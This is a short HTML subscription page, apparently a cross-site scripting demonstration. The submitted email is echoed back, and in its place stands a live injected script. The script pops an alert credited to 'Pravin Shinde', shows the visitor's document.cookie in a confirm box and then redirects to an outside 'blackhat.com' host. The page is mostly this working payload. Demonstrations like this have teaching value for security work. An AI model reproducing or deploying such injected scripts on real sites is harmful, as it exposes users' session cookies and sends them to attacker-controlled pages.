<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
  </head>
<body>
    <script src="analytics.js">
    </script>
<form action=# method="get">
<input type="text" name="email"><input type="submit" value="Subscribe!">
</form>
Thank you for subscription!<br>
Email <b><script> alert('This is XSS is crafted by Pravin Shinde'); if (window.confirm(document.cookie)){ document.location.href = "http://blackhat.com"; } </script></b> added to mailing list!
</body>
</html>
</html>
